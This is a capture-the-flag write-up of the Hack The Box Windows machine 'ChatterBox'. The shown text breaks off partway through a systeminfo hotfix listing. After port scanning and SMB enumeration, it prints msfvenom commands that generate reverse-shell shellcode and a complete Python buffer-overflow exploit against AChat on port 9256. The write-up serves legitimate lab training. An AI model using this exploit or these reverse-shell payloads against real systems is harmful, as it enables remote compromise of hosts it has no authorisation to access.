---
tags: achat, icacls, BoF
---

# HTB: ChatterBox

***Overview**: ChatterBox is a HTB windows box rated as medium, this box exploits the existence of Remote Buffer overflow vulnerability on a  service known as AChat chat system running on the machine to gain foothold. Then escalates privileges using reuse of credentials. This machine also has a little twist of changing permissions to view a sensitive file (root.txt) without administrative access. I really hope you enjoy this writeup, thanks for stopping by :)*


-  As usual we start with our Nmap scan, so we do our common port scan first

```shell
──(kali㉿kali)-[~/PNPT/machines]
└─$ nmap -sV -sC -oA nmap/devel_ports 10.10.10.74 -v
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 04:52 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating Ping Scan at 04:52
Scanning 10.10.10.74 [2 ports]
Completed Ping Scan at 04:52, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:52
Completed Parallel DNS resolution of 1 host. at 04:52, 0.17s elapsed
Initiating Connect Scan at 04:52
Scanning 10.10.10.74 [1000 ports]
Discovered open port 135/tcp on 10.10.10.74
Discovered open port 445/tcp on 10.10.10.74
Discovered open port 139/tcp on 10.10.10.74
Discovered open port 49156/tcp on 10.10.10.74
Increasing send delay for 10.10.10.74 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.10.74 from 5 to 10 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.10.74 from 10 to 20 due to max_successful_tryno increase to 6
Discovered open port 49154/tcp on 10.10.10.74
Increasing send delay for 10.10.10.74 from 20 to 40 due to 11 out of 28 dropped probes since last increase.
Discovered open port 49152/tcp on 10.10.10.74
Discovered open port 49155/tcp on 10.10.10.74
Discovered open port 49157/tcp on 10.10.10.74
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 94.99% done; ETC: 04:53 (0:00:02 remaining)
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 95.30% done; ETC: 04:53 (0:00:02 remaining)
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 95.50% done; ETC: 04:53 (0:00:02 remaining)
Discovered open port 49153/tcp on 10.10.10.74
Completed Connect Scan at 04:53, 48.07s elapsed (1000 total ports)
Initiating Service scan at 04:53
Scanning 9 services on 10.10.10.74
Service scan Timing: About 44.44% done; ETC: 04:55 (0:01:11 remaining)
Completed Service scan at 04:54, 61.70s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.10.74.
Initiating NSE at 04:54
Completed NSE at 04:54, 12.22s elapsed
Initiating NSE at 04:54
Completed NSE at 04:54, 0.01s elapsed
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Nmap scan report for 10.10.10.74
Host is up (0.15s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-06-19T13:54:38
|_  start_date: 2023-06-19T13:46:52
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-19T09:54:37-04:00
|_clock-skew: mean: 6h20m02s, deviation: 2h18m36s, median: 5h00m00s

NSE: Script Post-scanning.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.55 seconds

```

- then we will proceed with our full port scan using our masscan. So running the commands consecutively

```shell
sudo masscan -p1-65535 10.10.10.74 --rate=1000 -e tun0 > chatterbox
ports=$(cat chatterbox | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

```

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ sudo masscan -p1-65535 10.10.10.74 --rate=1000 -e tun0 > chatterbox
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-06-19 08:50:57 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
                                                                                  
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ cat chatterbox            
Discovered open port 49153/tcp on 10.10.10.74                                  
Discovered open port 49152/tcp on 10.10.10.74                                  
Discovered open port 135/tcp on 10.10.10.74                                    
Discovered open port 445/tcp on 10.10.10.74                                    
Discovered open port 9255/tcp on 10.10.10.74                                   
Discovered open port 49157/tcp on 10.10.10.74                                  
Discovered open port 49155/tcp on 10.10.10.74                                  
Discovered open port 139/tcp on 10.10.10.74                                    
Discovered open port 49154/tcp on 10.10.10.74                                  
Discovered open port 9256/tcp on 10.10.10.74                
                                                                                  
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ ports=$(cat chatterbox | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
                                                                                  
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ echo $ports
135,139,445,9255,9256,49152,49153,49154,49155,49157

```
- then we can then scan does ports using Nmap

```shell
──(kali㉿kali)-[~/PNPT/machines]
└─$ nmap -Pn -sV -sC -p$ports -oA nmap/devel_full 10.10.10.74 -v 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 05:09 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:09
Completed NSE at 05:09, 0.00s elapsed
Initiating NSE at 05:09
Completed NSE at 05:09, 0.00s elapsed
Initiating NSE at 05:09
Completed NSE at 05:09, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 05:09
Completed Parallel DNS resolution of 1 host. at 05:09, 0.08s elapsed
Initiating Connect Scan at 05:09
Scanning 10.10.10.74 [10 ports]
Discovered open port 135/tcp on 10.10.10.74
Discovered open port 445/tcp on 10.10.10.74
Discovered open port 139/tcp on 10.10.10.74
Discovered open port 49154/tcp on 10.10.10.74
Discovered open port 49155/tcp on 10.10.10.74
Discovered open port 9255/tcp on 10.10.10.74
Discovered open port 49153/tcp on 10.10.10.74
Discovered open port 9256/tcp on 10.10.10.74
Discovered open port 49157/tcp on 10.10.10.74
Discovered open port 49152/tcp on 10.10.10.74
Completed Connect Scan at 05:09, 1.41s elapsed (10 total ports)
Initiating Service scan at 05:09
Scanning 10 services on 10.10.10.74
Service scan Timing: About 60.00% done; ETC: 05:11 (0:00:37 remaining)
Completed Service scan at 05:10, 64.98s elapsed (10 services on 1 host)
NSE: Script scanning 10.10.10.74.
Initiating NSE at 05:10
Completed NSE at 05:11, 11.90s elapsed
Initiating NSE at 05:11
Completed NSE at 05:11, 0.66s elapsed
Initiating NSE at 05:11
Completed NSE at 05:11, 0.01s elapsed
Nmap scan report for 10.10.10.74
Host is up (0.16s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h20m01s, deviation: 2h18m34s, median: 5h00m00s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-06-19T14:10:55
|_  start_date: 2023-06-19T13:46:52
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-19T10:10:51-04:00

NSE: Script Post-scanning.
Initiating NSE at 05:11
Completed NSE at 05:11, 0.00s elapsed
Initiating NSE at 05:11
Completed NSE at 05:11, 0.00s elapsed
Initiating NSE at 05:11
Completed NSE at 05:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.25 seconds

```
- so now we can see the ports and the various services running on this ports, and we can take note of some of the following

```
Windows 7 Professional 7601 Service Pack 1 on port 445
AChat chat system httpd on port 9255
AChat chat system on port 9256
```

#### SMB enumeration
- As usual we can start with some SMB enumeration, so we can further enumerate the SMB port

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ nmap --script safe -p445 10.10.10.74
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 05:19 EDT
Pre-scan script results:
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-dropbox-listener: 
| displayname  ip            port   version  host_int             namespaces
|_             192.168.14.1  17500  2.0      2.9071672916761e+38  2589442961
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-wsdd-discover: 
|   Devices
|     239.255.255.250
|         Message id: d7ced417-9fc8-4953-b4fb-e7ea829360b1
|         Address: http://192.168.14.1:5357/ffa68f91-ebb7-4058-a7a9-7879148042b3/
|_        Type: Device pub:Computer
Nmap scan report for 10.10.10.74
Host is up (0.20s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| port-states: 
|   tcp: 
|_    open: 445
| smb2-capabilities: 
|   202: 
|     Distributed File System
|   210: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
|_fcrdns: FAIL (No PTR record)
| dns-blacklist: 
|   ATTACK
|     all.bl.blocklist.de - FAIL
|   SPAM
|     l2.apews.org - FAIL
|     bl.spamcop.net - FAIL
|     all.spamrats.com - FAIL
|     spam.dnsbl.sorbs.net - FAIL
|     bl.nszones.com - FAIL
|     list.quorum.to - FAIL
|     dnsbl.inps.de - FAIL
|   PROXY
|     dnsbl.tornevall.org - FAIL
|     misc.dnsbl.sorbs.net - FAIL
|     socks.dnsbl.sorbs.net - FAIL
|_    tor.dan.me.uk - FAIL
| smb2-time: 
|   date: 2023-06-19T14:19:41
|_  start_date: 2023-06-19T13:46:52
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     202
|_    210
|_clock-skew: mean: 6h20m02s, deviation: 2h18m37s, median: 5h00m00s
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-19T10:19:35-04:00
| smb-mbenum: 
|   Master Browser
|     CHATTERBOX  6.1  
|   Potential Browser
|     CHATTERBOX  6.1  
|   Server service
|     CHATTERBOX  6.1  
|   Windows NT/2000/XP/2003 server
|     CHATTERBOX  6.1  
|   Workstation
|_    CHATTERBOX  6.1  
|_msrpc-enum: NT_STATUS_ACCESS_DENIED

Post-scan script results:
| reverse-index: 
|_  445/tcp: 10.10.10.74
Nmap done: 1 IP address (1 host up) scanned in 49.72 seconds

```
- we can also try using smbclient but we can't list the shares , so we move forward cause our next enumeration seems more juicy :)
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.10.74\\ -N                                
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.74 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

#### AChat chat system enumeration
- so we can see that we have a service Achat chat system running on port 9255 and 9256
- so researching about exploits related to this service, we come across an exploit at [https://github.com/mpgn/AChat-Reverse-TCP-Exploit](https://github.com/mpgn/AChat-Reverse-TCP-Exploit) 
- looking at this exploit, we see that Achat 0.150 Beta7 is vulnerable to a Remote Buffer Overflow attack, and this exploit also gives us Remote Code Execution

#### Exploitation and Foothold
- so now we can then attempt this exploit, so firstly we generate a payload using the AChat_Payload.sh script

```shell
┌──(kali㉿kali)-[~/PNPT/machines/AChat-Reverse-TCP-Exploit]
└─$ ./AChat_Payload.sh 
RHOST: 10.10.10.74
LHOST: 10.10.14.7   
LPORT: 4444
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 876 (iteration=0)
x86/unicode_mixed chosen with final size 876
Payload size: 876 bytes
Final size of python file: 4318 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
*** SNIP ***
```

- in that script we can also find the msvenom command to generate the payload above, which we can run manually instead

```shell
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp RHOST=$RHOST LHOST=$LHOST LPORT=$LPORT exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

```
- then we can edit the Exploit script with the buffer payload and the IP of the target, and the script will look like this:

```python
#!/bin/usr/python
#Script written by UN1X00
#Tested 25/05/2018 Windows 7/8/10

import socket
import sys, time

class bcolours:
    GREEN = '\033[92m'
    TURQ = '\033[96m'
    ENDC = '\033[0m'

#YOU WILL NEED TO PASTE THE OUTPUT FROM THE SHELL SCRIPT: "ACHAT_PAYLOAD.SH" BELOW:

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x4b\x4c\x47\x78\x44\x4f\x6b\x50"
buf += b"\x39\x70\x39\x70\x6f\x70\x42\x69\x38\x65\x6d\x61"
buf += b"\x69\x42\x42\x44\x64\x4b\x50\x52\x50\x30\x72\x6b"
buf += b"\x32\x32\x4a\x6c\x64\x4b\x72\x32\x6d\x44\x4e\x51"
buf += b"\x59\x6f\x54\x4b\x33\x42\x6d\x58\x6a\x6f\x55\x67"
buf += b"\x4d\x7a\x4f\x36\x70\x31\x45\x70\x66\x4c\x6d\x6c"
buf += b"\x31\x51\x73\x4c\x7a\x62\x6c\x6c\x4f\x30\x57\x51"
buf += b"\x68\x4f\x6a\x6d\x4d\x31\x68\x47\x30\x49\x51\x65"
buf += b"\x38\x6f\x42\x32\x6e\x77\x44\x4b\x52\x32\x6a\x70"
buf += b"\x42\x6b\x30\x42\x6d\x6c\x4a\x61\x56\x70\x32\x6b"
buf += b"\x31\x30\x52\x58\x75\x35\x77\x50\x30\x74\x30\x4c"
buf += b"\x49\x71\x5a\x30\x74\x4b\x6d\x78\x7a\x78\x54\x4b"
buf += b"\x52\x38\x4d\x50\x39\x71\x39\x43\x32\x30\x33\x55"
buf += b"\x35\x79\x50\x74\x6d\x6c\x6d\x61\x69\x6f\x70\x49"
buf += b"\x54\x4b\x6d\x64\x44\x4b\x39\x71\x59\x46\x6c\x71"
buf += b"\x35\x70\x74\x6c\x69\x31\x46\x6f\x6a\x6d\x4d\x31"
buf += b"\x39\x37\x30\x38\x69\x50\x63\x45\x6c\x34\x79\x73"
buf += b"\x43\x4d\x78\x78\x6f\x4b\x31\x6d\x4b\x74\x62\x55"
buf += b"\x67\x70\x4e\x78\x52\x6b\x6e\x78\x4b\x74\x6a\x61"
buf += b"\x4a\x33\x33\x36\x64\x4b\x4c\x4c\x4e\x6b\x74\x4b"
buf += b"\x42\x38\x4d\x4c\x39\x71\x66\x73\x52\x6b\x59\x74"
buf += b"\x62\x6b\x4a\x61\x66\x70\x31\x79\x6f\x54\x6e\x44"
buf += b"\x4c\x64\x51\x4b\x61\x4b\x31\x51\x51\x49\x31\x4a"
buf += b"\x70\x51\x4b\x4f\x39\x50\x4f\x68\x4f\x6f\x50\x5a"
buf += b"\x44\x4b\x6a\x72\x49\x59\x43\x50\x4b\x4f\x39\x6f"
buf += b"\x4b\x4f\x6f\x6d\x32\x48\x6f\x43\x4c\x72\x4d\x30"
buf += b"\x6b\x50\x62\x48\x63\x47\x33\x43\x50\x32\x6f\x6f"
buf += b"\x72\x34\x53\x38\x6e\x6c\x44\x37\x4e\x46\x4d\x37"
buf += b"\x55\x39\x48\x68\x59\x6f\x58\x50\x44\x78\x54\x50"
buf += b"\x6d\x31\x59\x70\x79\x70\x6d\x59\x59\x34\x4e\x74"
buf += b"\x32\x30\x62\x48\x6f\x39\x71\x70\x30\x6b\x49\x70"
buf += b"\x49\x6f\x57\x65\x71\x5a\x6a\x6a\x43\x38\x79\x7a"
buf += b"\x6a\x6a\x6a\x6e\x4c\x47\x4f\x78\x4c\x42\x4d\x30"
buf += b"\x4a\x71\x4f\x6c\x33\x59\x49\x56\x42\x30\x70\x50"
buf += b"\x30\x50\x6e\x70\x4d\x70\x30\x50\x51\x30\x70\x50"
buf += b"\x50\x68\x38\x6a\x4c\x4f\x59\x4f\x6b\x30\x39\x6f"
buf += b"\x69\x45\x34\x57\x62\x4a\x6c\x50\x62\x36\x4f\x67"
buf += b"\x72\x48\x45\x49\x63\x75\x50\x74\x30\x61\x69\x6f"
buf += b"\x59\x45\x74\x45\x65\x70\x44\x34\x79\x7a\x69\x6f"
buf += b"\x70\x4e\x5a\x68\x61\x65\x78\x6c\x78\x68\x43\x37"
buf += b"\x4d\x30\x4b\x50\x79\x70\x30\x6a\x4d\x30\x6f\x7a"
buf += b"\x4a\x64\x72\x36\x42\x37\x61\x58\x6c\x42\x78\x59"
buf += b"\x45\x78\x61\x4f\x6b\x4f\x76\x75\x62\x63\x59\x68"
buf += b"\x4b\x50\x43\x4e\x4d\x66\x32\x6b\x6c\x76\x70\x6a"
buf += b"\x6d\x70\x51\x58\x6d\x30\x6a\x70\x59\x70\x39\x70"
buf += b"\x50\x56\x32\x4a\x59\x70\x32\x48\x30\x58\x44\x64"
buf += b"\x70\x53\x48\x65\x69\x6f\x5a\x35\x45\x43\x72\x33"
buf += b"\x50\x6a\x4d\x30\x52\x36\x52\x33\x50\x57\x62\x48"
buf += b"\x7a\x62\x59\x49\x48\x48\x71\x4f\x69\x6f\x37\x65"
buf += b"\x43\x53\x6c\x38\x49\x70\x63\x4d\x4f\x38\x61\x48"
buf += b"\x43\x38\x39\x70\x71\x30\x4d\x30\x49\x70\x4f\x7a"
buf += b"\x79\x70\x50\x50\x6f\x78\x4c\x4b\x4c\x6f\x4c\x4f"
buf += b"\x4e\x50\x6b\x4f\x78\x55\x70\x57\x70\x68\x63\x45"
buf += b"\x50\x6e\x6e\x6d\x50\x61\x6b\x4f\x76\x75\x71\x4e"
buf += b"\x51\x4e\x39\x6f\x7a\x6c\x4c\x64\x4a\x6f\x64\x45"
buf += b"\x30\x70\x4b\x4f\x79\x6f\x49\x6f\x78\x69\x65\x4b"
buf += b"\x69\x6f\x6b\x4f\x39\x6f\x6d\x31\x35\x73\x4c\x69"
buf += b"\x35\x76\x32\x55\x56\x61\x48\x43\x47\x4b\x67\x70"
buf += b"\x6d\x4d\x6e\x4a\x4b\x5a\x31\x58\x37\x36\x73\x65"
buf += b"\x37\x4d\x35\x4d\x79\x6f\x6a\x35\x4d\x6c\x7a\x66"
buf += b"\x43\x4c\x6b\x5a\x53\x50\x6b\x4b\x69\x50\x52\x55"
buf += b"\x5a\x65\x45\x6b\x30\x47\x5a\x73\x54\x32\x50\x6f"
buf += b"\x70\x6a\x6d\x30\x70\x53\x39\x6f\x6a\x35\x41\x41"

def main (buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = ('10.10.10.74', 9256)

    fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
    p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
    p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
    p += "\x62" + "A"*45
    p += "\x61\x40"
    p += "\x2A\x46"
    p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
    p += "\x61\x43" + "\x2A\x46"
    p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
    p += buf + "A" * (1152 - len(buf))
    p += "\x00" + "A"*10 + "\x00"

    print bcolours.GREEN + "[" + bcolours.TURQ + "+" + bcolours.GREEN + "]" + bcolours.ENDC + " BUFFER OVERFLOW PAYLOAD RELEASED -- CHECK YOUR HANDLER"

    i=0
    while i<len(p):
        if i > 172000:
            time.sleep(1.0)
        sent = sock.sendto(p[i:(i+8192)], server_address)
        i += sent
    sock.close()

if __name__=='__main__':
    main(buf)

```

- and we get a shell!!
##### Another Exploitation Method
- Instead of using the previous exploit, we can also decide to use the one at ExploitDB as well [https://www.exploit-db.com/exploits/36025](https://www.exploit-db.com/exploits/36025) and [https://tenaka.gitbook.io/pentesting/boxes/achat](https://tenaka.gitbook.io/pentesting/boxes/achat)
- so we generate payload using 

```shell
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.14.7 lport=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

- and change the IP in the script to that of the target which is 10.10.10.74 and run

![](assets/ChatterBox_assets/Pasted%20image%2020230619111318.png)

- And in our listener we get a shell

![](assets/ChatterBox_assets/Pasted%20image%2020230619111354.png)

- we then get our user flag

![](assets/ChatterBox_assets/Pasted%20image%2020230619111735.png)

- we can run the `systeminfo` command to view more information about our compromised machine

```shell
C:\Windows\system32>systeminfo
systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          6/19/2023, 9:46:43 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,559 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,634 MB
Virtual Memory: In Use:    461 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 183 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB2830477
                           [06]: KB2592687
                           [07]: KB2479943
                           [08]: KB2491683
                           [09]: KB2506212
                           [10]: KB2506928
                           [11]: KB2509553
                           [12]: KB2533552
                           [13]: KB2534111
                           [14]: KB2545698
                           [15]: KB2547666
                           [16]: KB2552343
                           [17]: KB2560656
                           [18]: KB2563227
                           [19]: KB2564958
                           [20]: KB2574819
                           [21]: KB2579686
                           [22]: KB2604115
                           [23]: KB2620704
                           [24]: KB2621440
                           [25]: KB2631813
                           [26]: KB2639308
                           [27]: KB2640148
                           [28]: KB2647753
                           [29]: KB2654428
                           [30]: KB2660075
                           [31]: KB2667402
                           [32]: KB2676562
                           [33]: KB2685811
                           [34]: KB2685813
                           [35]: KB2690533
                           [36]: KB2698365
                           [37]: KB2705219
                           [38]: KB2719857
                           [39]: KB2726535
                           [40]: KB2727528
                           [41]: KB2729094
                           [42]: KB2732059
                           [43]: KB2732487
                           [44]: KB2736422
                           [45]: KB2742599
                           [46]: KB2750841
                           [47]: KB2761217
                           [48]: KB2763523
                           [49]: KB2770660
                           [50]: KB2773072
                           [51]: KB2786081
                           [52]: KB2799926
                           [53]: KB2800095
                           [54]: KB2807986
                           [55]: KB2808679
                           [56]: KB2813430
                           [57]: KB2820331
                           [58]: KB2834140
                           [59]: KB2840631
                           [60]: KB2843630
                           [61]: KB2847927
                           [62]: KB2852386
                           [63]: KB2853952
                           [64]: KB2857650
                           [65]: KB2861698
                           [66]: KB2862152
                           [67]: KB2862330
                           [68]: KB2862335
                           [69]: KB2864202
                           [70]: KB2868038
                           [71]: KB2871997
                           [72]: KB2884256
                           [73]: KB2891804
                           [74]: KB2892074
                           [75]: KB2893294
                           [76]: KB2893519
                           [77]: KB2894844
